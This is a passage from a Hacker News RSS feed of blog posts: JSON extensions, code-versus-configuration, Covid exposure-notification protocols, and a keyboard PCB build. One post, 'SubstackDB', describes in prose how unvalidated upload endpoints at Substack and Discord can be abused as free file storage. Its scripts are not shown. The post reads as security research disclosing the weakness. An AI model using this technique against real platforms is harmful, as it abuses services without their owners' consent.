would ‘break’ our apps that have inadvertently relied on the previous
looser-than-the-spec implementation.</p>

<p>We could carry local patches, but that isn’t free. Upstream fuzz-testing
infrastructure only exercises the unmodified library, not our patched flavor.
Future upstream changes may also invalidate the downstream patch, possibly in
subtle ways. An upstream “this new unsafe block is OK because it’s a private
implementation detail and nothing in this crate does X” comment might not be
aware that our out-of-tree patch does X to its internals.</p>

<h3 id="quirks">Quirks</h3>

<p>The Wuffs library approach is to expose
<a href="https://github.com/google/wuffs/blob/3d6c609dc12de3c81e1b8079ceecf96370b086a2/doc/note/quirks.md">quirks</a>: runtime
configuration options to go off-spec in various ways so that Wuffs’
implementation can be a drop-in replacement for other implementations, without
the need for downstream patches.</p>

<p>Wuffs has <a href="https://github.com/google/wuffs/blob/3d6c609dc12de3c81e1b8079ceecf96370b086a2/std/json/decode_quirks.wuffs">20 JSON
quirks</a>
so far. As always, there are trade-offs. They’re not free (in terms of
maintenance cost) and have super-linear complexity: that file’s comments also
has 12 call-outs to the subtleties of combining two particular quirks.</p>

<p>Here’s an example of the emergent complexity when combining two simple-sounding
JSON extensions. The first one adds C++-style <code>/* slash-star block comments */</code>
and <code>// double-slash line comments</code>. The second one packs multiple top-level
values in a single stream, separated by line breaks.</p>

<p>That second extension - by itself and when holding minified, whitespace-free
‘vanilla’ (non-extended) JSON - plays well with Unix’s traditional
line-oriented tools. It is sometimes known as Line-Delimited JSON
(<a href="https://en.wikipedia.org/wiki/JSON_streaming#Line-delimited_JSON">LDJSON</a>),
Newline-Delimited JSON (<a href="http://ndjson.org/">NDJSON</a>) and JSON Lines
(<a href="http://jsonlines.org/">JSONL</a>). But “one value per line” tools’ assumptions
can break if slash-star comments can also contain blank lines.</p>

<p>Here’s another question (let’s call it the ‘end of comment’ question). Is the
<code>'\n'</code> at the end of of a <code>// double-slash line comment</code> actually part of the
comment? At first, this sounds merely philosophical. Comments are ignored and,
in ‘vanilla’ JSON, all whitespace is ignored, so why the distinction?</p>

<p>The ‘right’ answer to that ‘end of comment’ question isn’t obvious, but it can
affect whether a line comment at the end of a multi-value stream should end in
1 or 2 <code>'\n'</code> bytes. Ideally the answer should be self-consistent with whether
a line comment at the end of file must end with the <code>'\n'</code> or whether the
implicit EOF (end-of-file) alone suffices. See also the <a href="http://seriot.ch/parsing_json.php">“Parsing JSON is a
Minefield”</a> and <a href="https://nullprogram.com/blog/2019/12/28/">“Unintuitive JSON
Parsing”</a> articles for how subtle a
‘simple’ format like JSON can be.</p>

<p>Wuffs makes one particular choice for that ‘end of comment’ question. Its
particular choice probably isn’t that important, more that it made a concious
and documented choice.</p>

<h3 id="clarity-not-terseness">Clarity, not Terseness</h3>

<p>Some general advice, when designing a new file format or extending an existing
one, is keep some room for future extensions. For example, allowing unquoted
strings (writing <code>foo</code> instead of <code>"foo"</code>), is certainly convenient, but
re-defining <code>undefined</code> or <code>datetime</code> without quotes, from invalid JSON syntax
to valid some-extension-of-JSON strings, rules out a future extension adding
new ‘keywords’.</p>

<p><a href="https://cbor.io/">CBOR</a> is binary at the wire format level (unlike textual
JSON) but naturally extends JSON at the object model level. It also has an
<code>undefined</code> concept separate from <code>null</code>, and <code>undefined</code> can be a map key. We
couldn’t do the ‘obvious’ CBOR-to-some-extended-JSON conversion if <code>undefined</code>,
without quotes, was already repurposed to mean a string.</p>

<p>I find it suprising that, <a href="https://github.com/lightbend/config/blob/master/HOCON.md#unquoted-strings">in
HOCON</a>,
“<code>truefoo</code> parses as the boolean token <code>true</code> followed by the unquoted string
<code>foo</code>. However, <code>footrue</code> parses as the unquoted string <code>footrue</code>”.</p>

<p>It can also be helpful for a <a href="https://github.com/search?q=return.flase+extension%3Apy">typo like
<code>flase</code></a> to be picked
up early as a syntax error (without needing schemas or type checking) instead
of silently accepted (as a string, not a bool). This can otherwise be
especially dangerous if further processed in a weakly-typed programming
language where any non-empty string is ‘truthy’.</p>

<p><code>[a b c]</code> is invalid ‘vanilla’ JSON syntax, but in the various extended-JSON
variants, is it a list with three 1-byte strings or one 5-byte string? Or is it
one 3-byte string because three 1-byte strings are implicitly
whitespace-delimited and also then implicitly concatenated? Any particular
answer can be consistent in its own world, but different JSON extensions make
different choices. This can be confusing when software grows large enough (or
gains enough transitive dependencies) to have to speak multiple JSON
extensions.</p>

<p>These days, when I’m programming in C/C++ or Go, I often add unnecessary
parentheses in expressions like <code>(a * b) + c</code>. Even though they’re redundant
because of well-defined operator precedence rules, different programming
languages have different precedence rules and getting the precedence wrong can
lead to <a href="https://github.com/jbangert/nail/issues/7">hard-to-spot bugs</a>. The
Wuffs language actually <a href="https://github.com/google/wuffs/blob/3d6c609dc12de3c81e1b8079ceecf96370b086a2/doc/wuffs-the-language.md#operators">rejects a bare <code>a * b +
c</code></a>
and you have to parenthesize the multiplication or the addition.</p>

<p>Similarly, for JSON-like documents, I prefer the clarity of either <code>["a", "b",
"c"]</code> or <code>["a b c"]</code>, even if it means a little extra typing. Reading is more
important than writing for code and configuration, especially when multiple
people or long periods of time are involved.</p>

<h2 id="introducing-jwcc">Introducing JWCC</h2>

<p>Having said all of that, here is yet another superset-of-JSON, called JWCC
(JSON With Commas and Comments). It is a minimal extension. As its name
suggests, there are only two new features:</p>

<ul>
  <li>“Commas” lets you optionally have a comma after the final element of an array
or an object: <code>[1,2,3,]</code>. When you format one element per line, it’s easier
to insert and remove elements (and eyeball the diffs) when you don’t have to
fiddle with any commas (or lack of commas) on adjacent but otherwise
unrelated lines.</li>
  <li>“Comments” lets you have C++-style <code>/* slash-star block comments */</code> and <code>//
double-slash line comments</code>, anywhere where ‘vanilla’ JSON allows whitespace.
Line comments must end with a <code>'\n'</code> byte, even at the end of the file.</li>
</ul>

<p>To be clear, while every JSON file is valid JWCC, this is a new file format. It
just happens to be very familiar if you (or your software) already speak JSON.
Yes, Doug Crockford <a href="https://web.archive.org/web/20150105080225if_/https://plus.google.com/+DouglasCrockfordEsq/posts/RK8qyGVaGSr">deliberately removed comments from
JSON</a>
but people keep putting them back in. If we’re going to have comment-enriched
JSON (e.g. for human-editable configuration files), we might as well have a
standard one. Cue <a href="https://xkcd.com/927/">XKCD #927 “Standards”</a>.</p>

<h3 id="cc-implementation">C/C++ Implementation</h3>

<p><a href="https://github.com/google/wuffs">Wuffs</a>’ JSON library (availble as a C or C++
API) can decode either ‘vanilla’ JSON or JWCC, using its quirks mechanism.
<a href="https://github.com/google/wuffs/tree/3d6c609dc12de3c81e1b8079ceecf96370b086a2/example/jsonptr"><code>jsonptr</code></a>
is a command line tool (a JSON formatter) that uses this library. By default,
it speaks spec-compliant ‘vanilla’ JSON:</p>

<div><div><pre><code>$ echo '[1,2,/*hello*/3,]' | jsonptr
[
    1,
    2
json: bad input
</code></pre></div></div>

<p>It has a JWCC mode:</p>

<div><div><pre><code>$ echo '[1,2,/*hello*/3,]' | jsonptr -jwcc
[
    1,
    2,
    /*hello*/
    3,
]
</code></pre></div></div>

<p>It can also convert from JWCC syntax to …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nigeltao.github.io/blog/2021/json-with-commas-comments.html">https://nigeltao.github.io/blog/2021/json-with-commas-comments.html</a></em></p>]]>
            </description>
            <link>https://nigeltao.github.io/blog/2021/json-with-commas-comments.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26224255</guid>
            <pubDate>Mon, 22 Feb 2021 13:30:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Write Code, Not Configuration]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26224186">thread link</a>) | @meebob
<br/>
February 22, 2021 | http://catern.com/config.html | <a href="https://web.archive.org/web/*/http://catern.com/config.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
When you write a program which might use one of multiple implementations,
or needs to connect to some URL,
or needs some information to function,
your first step should be to just hardcode it.
Use one implementation, hardcode one URL, use one specific piece of information.
<p>
If, after doing so, you find that you need another program
with different hardcoded information,
turn your program into a function.
Take the implementation as an argument,
take the URL as an argument,
take the information you need as an argument.
</p><p>
And then just call that function with the arguments you prefer,
each time you need a program with different "configuration".
</p><p>
You don't need to load those arguments from some file on disk,
or by querying some database or service,
or even by taking them as command line parameters.
</p><p>
Just make a separate program for each case.
</p><p>
For a batch job, this might mean a few different executables,
tweaked and rebuilt frequently over time as one's needs change.
</p><p>
For a user-facing application, this might mean that each user runs their own custom executable,
compiled for or by them, with pre-compiled shared libraries common between all users.
</p><p>
For a daemon providing some network service and connecting to other services,
this might mean 10 or so different executables,
which are run in the 10 or so different availability zones or datacenters or sorts of machines
on which this daemon is deployed.
Or for a more heterogeneous deployment,
it might mean many thousands of different executables,
deployed to many thousands of different environments,
each layered on top of a common image with shared libraries identical between all deployments.
</p><p>
If you want to share information between multiple programs with different configurations,
share it in the same way you share code: with a library.
</p><p>
If you want to make your configuration more dynamic,
write code to dynamically determine the arguments to pass.
</p><p>
If you want to make rapid changes and don't want to wait for builds,
call the function from a REPL, or rely on fast incremental builds.
</p><p>
If you want to see what arguments are being passed to your function in your program,
use logging and debuggers, according to your preference.
</p><p>
Code written in this way in your actual programming language
is far more expressive than code written in a configuration DSL,
like JSON, YAML, or Dhall.
</p><p>
In a configuration DSL,
one would select from multiple implementations by manipulating some identifier for the implementations;
a string or a sum type, perhaps.
This might be formatted in an invalid way,
or might be from the wrong version,
or might be incompatible,
or any number of possible issues.
</p><p>
But in any general-purpose programming language,
implementations are first class values which can be passed around and manipulated,
whether as an object, a module, a struct of function pointers, or something else.
One can write a function (or a template, a functor, a macro, or something else)
which takes the implementation directly as an argument,
with no possibility of issues due to mismatches between a string identifier and the actually available implementations.
</p><p>
In a typical configuration DSL,
we would specify a set of key-value pairs to configure some component.
We might run some validator over the DSL to ensure it matches some schema
which we know our code will eventually load.
</p><p>
But static checks in general purpose programming languages, such as type checkers,
perform "validation" of the "schema" of our configuration for free,
wherever we pass arguments to functions.
Required arguments must be present, and even must be of the correct type,
and there's no need to keep our code in sync with a schema.
</p><p>
Writing code in your general purpose language
is easier, faster, and better
than writing separate configuration.
</p><p>
Of course, this is all easier with faster and more powerful build systems,
like Nix,
or with interpreted or fast-building languages,
like Python,
or with, at least, shared libraries and a fast link step,
like dynamic libraries in C.
</p><p>
If you're on a slow, weak, and hard-to-use build system,
with a slow-building language,
and you have slow linking,
then you probably want to fix one or more of those issues first;
although if your programs are small, even those issues are not necessarily prohibitive.
</p><p>
And you might also be in a corporate environment,
where code changes require an extensive and painful process,
but configuration changes can be made relatively easily.
If so, consider quitting.
</p><h3>Further reading</h3>
<ul>
  <li><a href="http://mikehadlow.blogspot.com/2012/05/configuration-complexity-clock.html">The Configuration Complexity Clock</a>
  </li><li><a href="http://www.object-oriented-security.org/lets-argue/singletons">Singletons Considered Harmful</a>
  </li><li><a href="http://hackage.haskell.org/package/xmonad-contrib-0.16/docs/XMonad-Doc-Configuring.html">XMonad configuration</a>
  </li><li><a href="https://st.suckless.org/">st configuration</a>
</li></ul>
</div>]]>
            </description>
            <link>http://catern.com/config.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26224186</guid>
            <pubDate>Mon, 22 Feb 2021 13:24:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SubstackDB: Exploiting Lax Upload Validation to Create Parasitic File Servers]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26224143">thread link</a>) | @dgaff
<br/>
February 22, 2021 | http://devingaffney.com/substackdb-exploiting-lax-upload-validation-to-create-parasitic-file-servers/ | <a href="https://web.archive.org/web/*/http://devingaffney.com/substackdb-exploiting-lax-upload-validation-to-create-parasitic-file-servers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
    <article itemtype="http://schema.org/BlogPosting">
        <section>
            <p>For the past year, I've been increasingly focusing on what I have come to call "sociotechnical security" - whereas "technical security" seeks to identify and remove unintended flaws in the architecture of platforms, "sociotechnical security" is all about identifying and removing the incentives for how worst-faith users may abuse the explicit intent of platform affordances. Making this "sociotechnical" distinction brings into the frame a lot of issues not typically considered to be security issues, but are proving to become existential threats to a bunch of different businesses. Social platforms have misinformation problems due (in part) to fake accounts spreading it, online marketplaces face algorithmic manipulation challenges from sellers jockeying for position, and platforms with weak security around analytics face all sorts of ad and impression count fraud.</p>

<p>Today I want to share an exploit that I spent the last week investigating, and am calling "SubstackDB," after Substack, where I first identified the problem. Specifically, platforms tend to prefer low-friction interfaces, and tend to afford users increasing flexibility in affordances provided. Substack's WYSIWYG editor for drafting posts is overly optimistic in assuming good faith in user behavior, and is exposed to a huge flaw - because there is no validation for the input of files uploaded into the editor, and because their upload functionality has no verification scheme beyond requiring an active user session, their file server can be hijacked for any arbitrary use case. Far from being the only company facing this issue, Discord also suffers from a nearly identical problem. As a proof of concept, I used the unpublished APIs for both Substack and Discord's file uploading capabilities to store copies of GPT2 on their servers, and I provide the necessary scripts for loading and verifying the execution of those models. Additionally, I am providing a ruby implementation of <code>SubstackDB</code> which, given a valid username and password allows a user to upload and download any file of any size.</p>

<h2 id="substackvulnerability">Substack Vulnerability</h2>

<p><img src="https://i.imgur.com/VQhkAow.png" alt="Substack Editor"></p>

<p>This is a picture of Substack's WYSIWYG post editor with an example image uploaded. Here's a look at the <code>cURL</code> request that uploaded the image, and the response back from the server:</p>



<p>And the response:  </p>



<p>It turns out that this "bucketeer" name refers to a Heroku file server plugin, which presumably also indicates that Substack is at least partially hosted there. Regardless, through trial and error, I determined that only a very small portion of the above <code>cURL</code> is required to send a file:</p>

<p>Here, the <code>[BASE 64 BYTES]</code> refers to literally any content that is Base64 encoded. In our case it is an image, but it turns out that any data encoded in Base64 will be treated as valid input. Through more trial and error, I determined that while there seems to be no upper limit to the size of an uploaded file, though it is in practice limited by timeout errors that ultimately invalidate the request. Further, this "image" upload functionality actually returns the original file byte-for-byte, so no compression occurs between upload and receiving the final URL - because of this, we can store any other data relatively easily and just declare the "type" of the content to be one of the valid types required by the upload endpoint.</p>

<p>To prove that any arbitrary content could be uploaded, I downloaded a copy of the GPT2 "medium" model via <code>aitextgen</code>, split the <code>.bin</code> file containing the model into several hundred smaller files of equal size, and then uploaded those to Substack's endpoint. Finally, I wrote a script that reconstructs the model using a final "manifest" JSON file stored on Substack as well:</p>



<h2 id="discordvulnerability">Discord Vulnerability</h2>

<p>Discord's vulnerability seems a bit more intentional as a feature than as a bug per se, but is still ripe for abuse. Using a throwaway account and throwaway server, I was granted a set of credentials - using those credentials, I was able to slightly alter the script I used to upload GPT2.</p>

<p><img src="https://i.imgur.com/rdwMF5D.png" alt="Uploaded 6mb slices of GPT2"></p>

<p>Discord appears to treat non-image uploads as more of a first-order object in their system - clearly, there is some form of intent to allow users to upload files of some nature. What is likely outside the intent, however, is automating this affordance to send gigabytes of content through their platform in a relatively short time frame. Ultimately, I was able to generate a nearly identical script as was deployed in the Substack case.</p>



<h2 id="substackdbscript">SubstackDB Script</h2>

<p>Finally, to prove out the concept of truly using this type of vulnerability as an arbitrary file server, I wrote a generalized <code>SubstackDB</code> class which, in this version of the script, takes as input the username, password, and filepath, and returns a print-out of whether or not the contents of that filepath, once read, uploaded, and downloaded, is identical to the original source file. In practice, one could use this script to be a literal drop-in replacement for many classic file store APIs. </p>



<h2 id="endnote">Endnote</h2>

<p>This is just two examples of a general problem with upload validation. Of note, I also explored exploits like this on Meetup, Indiegogo, Gumroad, and a few others, and while it was still likely <em>technically</em> possible to pull off a similar stunt, it was in no way worth the investment in time that it would take to fully reverse engineer their implementations - generally, the issue was that one-time-use tokens were being employed to validate uploads on a per-upload basis, which proved to be too much of a pain to solve. The point, however, is that this is a demonstration of a systemic issue - by assuming best-faith use, platforms allow worst-faith users the unintended "sociotechnical" affordance of a free fileserver at the cost of the platform. </p>
            
            
            
        </section>
        
    </article>
</div></div>]]>
            </description>
            <link>http://devingaffney.com/substackdb-exploiting-lax-upload-validation-to-create-parasitic-file-servers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26224143</guid>
            <pubDate>Mon, 22 Feb 2021 13:18:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Desire Covid-19 exposure notification]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26224023">thread link</a>) | @programLyrique
<br/>
February 22, 2021 | https://privatics.inrialpes.fr/desire/ | <a href="https://web.archive.org/web/*/https://privatics.inrialpes.fr/desire/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>
On April 2020, the PRIVATICS Inria team (FR) and the Fraunhofer (DE) colleagues designed the CNIL-approved <a href="https://github.com/ROBERT-proximity-tracing/documents">ROBERT</a> privacy preserving exposure notification protocol, used by the French <a href="https://www.economie.gouv.fr/stopcovid#">StopCovid/TousAntiCovid national app</a>, and available since June 2nd.
The PRIVATICS team also designed the <a href="https://github.com/3rd-ways-for-EU-exposure-notification/project-DESIRE">DESIRE</a> protocol on May 2020, as an advanced solution.
</p>

<div>
We followed several key goals with ROBERT:
<ul>
	<li><b>(Goal #1) be efficient</b>: it's of course the primary goal of any exposure notification app;
	</li><li><b>(Goal #2) be sovereign</b>: because this is the only way to keep full control of technical choices and citizen's data;
	</li><li><b>(Goal #3) be privacy friendly</b>: such a service is sensitive, and privacy - our research topic - is a must.
</li></ul>
With DESIRE, we added one more goal:
<ul>
	<li><b>(Goal #4) be flexible</b>: "one size does not always fit all". DESIRE enables country-specific deployments.
</li></ul>
</div>

      </div></div>]]>
            </description>
            <link>https://privatics.inrialpes.fr/desire/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26224023</guid>
            <pubDate>Mon, 22 Feb 2021 13:03:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The birth of Prolog (1992) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26223906">thread link</a>) | @alokrai
<br/>
February 22, 2021 | http://alain.colmerauer.free.fr/alcol/ArchivesPublications/PrologHistory/19november92.pdf | <a href="https://web.archive.org/web/*/http://alain.colmerauer.free.fr/alcol/ArchivesPublications/PrologHistory/19november92.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://alain.colmerauer.free.fr/alcol/ArchivesPublications/PrologHistory/19november92.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-26223906</guid>
            <pubDate>Mon, 22 Feb 2021 12:51:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Microsoft Sculpt Wired Conversion Mod]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26223805">thread link</a>) | @yuribro
<br/>
February 22, 2021 | https://chadaustin.me/2021/02/wired-sculpt/ | <a href="https://web.archive.org/web/*/https://chadaustin.me/2021/02/wired-sculpt/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>I made a control board for the Microsoft Sculpt wireless keyboard that converts it to wired USB, and now my favorite keyboard is even better.</p>

<figure>
<a href="https://chadaustin.me/images/sculpt/finished-board.jpeg"><img src="https://chadaustin.me/images/sculpt/finished-board.jpeg" alt="The finished and installed board."></a>
<figcaption>The finished and installed board.</figcaption>
</figure>

<figure>
<a href="https://chadaustin.me/images/sculpt/messy-desk.jpeg"><img src="https://chadaustin.me/images/sculpt/messy-desk.jpeg" alt="Wired keyboard and the resulting project mess!"></a>
<figcaption>Wired keyboard and the resulting project mess!</figcaption>
</figure>

<figure>
<a href="https://chadaustin.me/images/sculpt/underside.jpeg"><img src="https://chadaustin.me/images/sculpt/underside.jpeg" alt="USB cable and reset button."></a>
<figcaption>USB cable and reset button.</figcaption>
</figure>

<p>The QMK config is available at <a href="https://github.com/chadaustin/qmk_firmware">@chadaustin/qmk_firmware</a> (<a href="https://github.com/chadaustin/qmk_firmware/tree/master/keyboards/handwired/sculpt">keyboards/handwired/sculpt/</a>), and the PCB design files at <a href="https://github.com/chadaustin/wired-sculpt-pcb">@chadaustin/wired-sculpt-pcb</a>.</p>

<p>I’m planning on making at least one more, so if you’d like one, maybe I can help.</p>

<p>It’s a huge improvement. Latency is reduced by about 13 milliseconds, and with full control over the microcontroller’s firmware, you can customize keymaps and layers, and actually use the keyboard’s built-in LEDs.</p>

<h2 id="why">Why?</h2>

<p>Feel free to stop reading here — I am going to tell the sequence of events that led to this project. Besides some exposure to basic voltage and resistance circuits in college, I have very little electronics background. But, in a short time, I went from only barely knowing what a capacitor was to having a working PCB manufactured and assembled, and maybe this will inspire someone else to give it a try.</p>

<p>Since developing RSI in college, I’ve exclusively used Microsoft’s ergonomic keyboards. And when I first tried the Sculpt, I instantly knew it was the best yet. The soft actuation, short key travel, and rigid frame are perfect for my hands. And because the number pad is a separate device, the distance to my mouse is shortened.</p>

<p>My brother went out and bought one too. Not much later, he gave it to me, saying the latency was inconsistent and high, and it was unacceptable for gaming. I thought he was being uniquely sensitive, since I had no problem in either Linux, Windows 7, or macOS. But then I updated to Windows 10 and saw exactly what he meant.</p>

<p>It was like the keyboard would go to sleep if a key wasn’t pressed for a few seconds, and the first keypress after a wake would be delayed or, worse, dropped.</p>

<p>And heaven forbid I use my USB 3 hub, whose EMI would disrupt the 2.4 GHz signal, and <em>every other</em> keypress would be unreliable. I’d gone as far as mounting the wireless transceiver directly under my keyboard, on the underside of my desk, and keys were still dropped.</p>

<p>So, best keyboard ever. But wireless sucks. (But mostly in Windows 10? No idea about that.)</p>

<h2 id="over-the-hump">Over the Hump</h2>

<p>What started this whole thing is that the <a href="https://github.com/facebookexperimental/eden/#edenfs">EdenFS</a> team was a bunch of keyboard enthusiasts. During the pandemic, as we’re all at home burning out and missing each other, we were trying to think of some virtual team offsites. Wez offered to walk everyone through building a <a href="https://www.1upkeyboards.com/instructions-downloads/sweet-16-instructions/">Sweet 16 Macro Pad</a>.</p>

<figure>
<a href="https://chadaustin.me/images/sculpt/sweet-16.jpeg"><img src="https://chadaustin.me/images/sculpt/sweet-16.jpeg" alt="Assembled Sweet 16 underside"></a>
<figcaption>Assembled Sweet 16 underside. This is take two, after resoldering and cleaning the whole thing. Take one was a bit of a mess.</figcaption>
</figure>

<p>So, okay, a keyboard is a matrix, with some diodes used to disambiguate the signalling, and a microcontroller that rapidly polls the matrix and reports events over USB…</p>

<p>So maybe I could fix the Sculpt! I bought a transceiver-less Sculpt off eBay for cheap and <a href="http://emmanuelcontreras.com/how-to/how-to-disassemble-microsoft-sculpt-ergonomic-keyboard-and-make-it-wired/">popped it open (thanks Emmanuel Contreras!)</a>, thinking maybe its controller could be flashed with new firmware that speaks USB. The Sculpt uses a <a href="https://infocenter.nordicsemi.com/pdf/nRF24LE1_PS_v1.6.pdf">Nordic Semiconductor nRF24LE1</a>, but I was nowhere near capable of making use of that information at the time, though it did point me to Samy Kamkar’s horrifying guide on <a href="https://samy.pl/keysweeper/">surreptitiously sniffing keystrokes from nearby (older) Microsoft wireless keyboards</a>.</p>

<p>I almost gave up here, but Per Vognsen <a href="https://twitter.com/pervognsen/status/1322422385174220800">suggested I scan the matrix myself</a> and it turns out Michael Fincham had already <a href="https://www.reddit.com/r/MechanicalKeyboards/comments/bhkgnp/modification_photos_qmk_wired_microsoft_sculpt/">mapped out the matrix and soldered a Teensy 2.0++ board onto the Sculpt’s test pads</a>, showing this was doable!</p>

<p>So I ordered my own microcontroller to try the same thing.</p>

<p>First, I bought an Arduino Pro Micro, like the Sweet 16 uses. Oh hey, 18 GPIO pins isn’t enough to drive the Sculpt’s 26-pin matrix. I looked at using an I2C GPIO expander, but it felt like taking on too much.</p>

<figure>
<a href="https://chadaustin.me/images/sculpt/pro-micro.jpeg"><img src="https://chadaustin.me/images/sculpt/pro-micro.jpeg" alt="Arduino Pro Micro"></a>
<figcaption>Arduino Pro Micro. Wait, you need pins to scan a matrix?</figcaption>
</figure>

<p>More pins? QMK’s Proton C has more pins! So I carefully soldered onto the test pads as Michael had shown was possible… and it worked!</p>

<figure>
<a href="https://chadaustin.me/images/sculpt/proton-c.jpeg"><img src="https://chadaustin.me/images/sculpt/proton-c.jpeg" alt="QMK Proton C"></a>
<figcaption>QMK Proton C. It's a beautiful board.</figcaption>
</figure>

<figure>
<a href="https://chadaustin.me/images/sculpt/test-pads.jpeg"><img src="https://chadaustin.me/images/sculpt/test-pads.jpeg" alt="Soldering test pads to Proton C."></a>
<figcaption>Soldering test pads to Proton C.</figcaption>
</figure>

<figure>
<a href="https://chadaustin.me/images/sculpt/all-test-pads.jpeg"><img src="https://chadaustin.me/images/sculpt/all-test-pads.jpeg" alt="All test pads connected to Proton C. It works!"></a>
<figcaption>All test pads connected to Proton C. It works!</figcaption>
</figure>

<p>Getting those wires to stick to the pads without shorting was tricky. (I hadn’t yet discovered how magical flux is.)</p>

<p>The keyboard worked, but I couldn’t fit the board, its wires, and the new microcontroller into the case, and I wasn’t <em>really</em> happy leaving it in this state, even if I could pack it in somehow.</p>

<p>I thought, all I <em>really</em> need is the ribbon cable connector, so I ordered a 30 pin, 1.0 mm pitch ribbon breakout and the pricier (but tons of pins!) <a href="https://www.pjrc.com/store/teensypp.html">Teensy 2.0++</a>. Looking back, it’s cute that I was trying to save $10 on the microcontroller… You just have to get used to spending money on whatever saves you time.</p>

<figure>
<a href="https://chadaustin.me/images/sculpt/breakout-and-teensy.jpeg"><img src="https://chadaustin.me/images/sculpt/breakout-and-teensy.jpeg" alt="Ribbon cable breakout and Teensy 2.0++"></a>
<figcaption>Ribbon cable breakout and Teensy 2.0++</figcaption>
</figure>

<p>Well, it was almost as annoying to solder, and still didn’t fit. So much for saving money on microcontrollers.</p>

<p>I thought about giving up. Is it really that bad that my keys don’t always register in games? Can I just tolerate some flakiness and latency?</p>

<p>But Jon Watte offered to spend an entire day showing me how to use KiCad, design circuits, layout PCBs, select components on Digi-Key, scan datasheets for the important information, and how to work with a PCB manufacturing house. Of course you never turn down opportunities like that.</p>

<h2 id="designing-the-final-board---schematic">Designing the Final Board - Schematic</h2>

<p>Assuming, like me, you’ve never done this, I’ll summarize the steps.</p>

<p>First you sketch out the circuit schematic.</p>

<figure>
<a href="https://chadaustin.me/images/sculpt/schematic.png"><img src="https://chadaustin.me/images/sculpt/schematic.png" alt="Schematic"></a>
<figcaption>Schematic in KiCad. Most of this was informed by the datasheet and Atmel's design guides.</figcaption>
</figure>

<p>Jon showed me several tricks in KiCad, like global labels, and starting with some standard resistor and capacitor values, but it’s very important that you go through the datasheets, because details can matter a ton.</p>

<p>I knew I wanted the main processor to be the AT90USB1286 controller, and fortunately KiCad already had a symbol for it. Atmel has a comprehensive and accessible data sheet, which showed me I needed some 22 Ω resistors on the USB data lines, which of the ISP programmer lines needed resistors (and appropriate values), and that I needed to either pull HWB low, or provide a physical switch that pulls it low, in order to allow rebooting the device into USB firmware update mode.</p>

<p>There are a bunch of things that are implicitly known to electrical engineers but that were new to me. You want:</p>

<ul>
  <li>a ground plane under the data lines and most of the microcontroller if possible.</li>
  <li>an electrolytic or tantalum bypass capacitor on the main 5V power from USB.</li>
  <li>ceramic filter capacitors on each power pin.</li>
  <li>appropriate values for the resonance capacitors on your crystal.</li>
  <li>electrostatic discharge protection! Turns out transients are common and it’s easy to fry a chip just by plugging it in.</li>
</ul>

<p>And then when you get into concerns like EMI and high-frequency signal integrity, the rabbit hole goes deep.</p>

<p>I kept having to tell myself “it’s just a keyboard”, but it also helped that there are a great number of high-quality resources on these topics just a click away. I spent lots of time on <a href="https://www.eevblog.com/">EEVBlog</a>.</p>

<p>Before finishing the circuit design, Jon had me do a couple smart things. In case the factory-supplied USB bootloader didn’t work out, he suggested I add the footprint (but not a connector!) for an ISP programmer and a debug LED to prove code would work at all.</p>

<h2 id="designing-the-final-board---physical-layout">Designing the Final Board - Physical Layout</h2>

<p>After arranging the schematic and ensuring it passed the electrical rules check, it was time to pick specific components. That is, the reference to a 220 Ω resistor is replaced with the Panasonic ERJ-3EKF2200V, 0603 surface mount.</p>

<p>There are a couple things to keep in mind. For common components, like resistors and ceramic capacitors, there is a huge amount of choice. For example, I see over 1400 surface-mount 220 Ω resistors on digikey. I tried to just stick with one high-quality brand like Panasonic or Samsung for all of that stuff.</p>

<p>The important thing is the physical form factor, which determines the footprint on the board. Once you pick a part, it has a size, and you need to tell KiCad which physical footprint should be assigned to that component. I used 0603 resistors, so I assigned each resistor in the schematic the “Resistor_SMD:R_0603_1608Metric” footprint.</p>

<p>Same for everything else. Jon showed me how to draw my own footprints, but to avoid complexity, I was able to find appropriate footprints in KiCad’s standard libraries for every component I needed.</p>

<p>When you import the schematic into Pcbnew, it’s time to figure out where things go. Where are the edges of the board? Make careful measurements here. Where do the mounting holes go? Where do you want 
the microcontroller? Where do you want the USB port?</p>

<figure>
<a href="https://chadaustin.me/images/sculpt/dimensions.jpeg"><img src="https://chadaustin.me/images/sculpt/dimensions.jpeg" alt="Measuring dimensions and mounting holes"></a>
<figcaption>Measuring dimensions and mounting holes</figcaption>
</figure>

<p>Also, you have to pick through-hole sizes and trace widths. Jon had me use .250 mm for the narrow traces and .500 mm for the wider ones, presumably from experience. I used the narrow traces for signalling and wide traces for power, though I’ve since heard it’s a good idea to use narrow traces between filter capacitors and VBUS.</p>

<figure>
<a href="https://chadaustin.me/images/sculpt/pcb-layout.svg"><img src="https://chadaustin.me/images/sculpt/pcb-layout.svg" alt="Schematic"></a>
<figcaption>PCB layout in KiCad</figcaption>
</figure>

